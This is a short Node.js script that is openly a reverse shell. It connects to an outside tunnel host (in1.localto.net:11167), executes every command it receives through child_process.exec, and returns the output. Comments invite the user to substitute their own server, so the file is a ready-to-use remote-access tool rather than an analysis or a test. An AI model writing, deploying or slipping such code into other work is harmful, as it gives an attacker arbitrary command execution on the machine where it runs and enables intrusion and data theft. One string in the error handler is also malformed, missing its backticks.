const net = require('net');
const { exec } = require('child_process');

// Replace these with your actual Ngrok URL and port
const server = 'in1.localto.net'; // swap with your own server
const port = 11167; // swap with your own port

const client = new net.Socket();
client.connect(port, server, () => {
console.log('Connected to remote server');
client.write('Reverse shell connection established\n');
});

client.on('data', (data) => {
exec(data.toString(), (error, stdout, stderr) => {
if (stdout) client.write(stdout);
if (stderr) client.write(stderr);
if (error) client.write(error.message);
});
});

client.on('error', (err) => {
console.error(Connection error: ${err.message});
client.destroy();
});

client.on('close', () => {
console.log('Connection closed');
});